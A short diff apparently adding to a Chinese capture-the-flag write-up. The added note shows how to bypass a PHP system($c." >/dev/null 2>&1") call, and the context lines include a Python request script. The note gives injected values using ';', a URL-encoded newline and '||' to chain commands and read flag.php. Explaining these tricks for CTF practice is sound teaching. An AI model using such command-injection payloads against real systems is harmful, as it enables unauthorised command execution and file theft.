@@ -169,3 +169,10 @@ print(payload)
 response = requests.post(URL, data={'c': urllib.parse.unquote(payload)})
 print(response.text)
 ```
+命令注入的绕过真的有很多有意思的故事呢：<br>
+```php
+// 如果你遇到了一个system($c." >/dev/null 2>&1");可以尝试以下方式绕过
+c=cat flag.php; //;是用来分割命令的
+c=nl flag.php%0a //%0a是换行符
+c=tac flag.php|| // ||连接2个命令，如果前面一个命令执行成功，就不执行后一个命令
+```
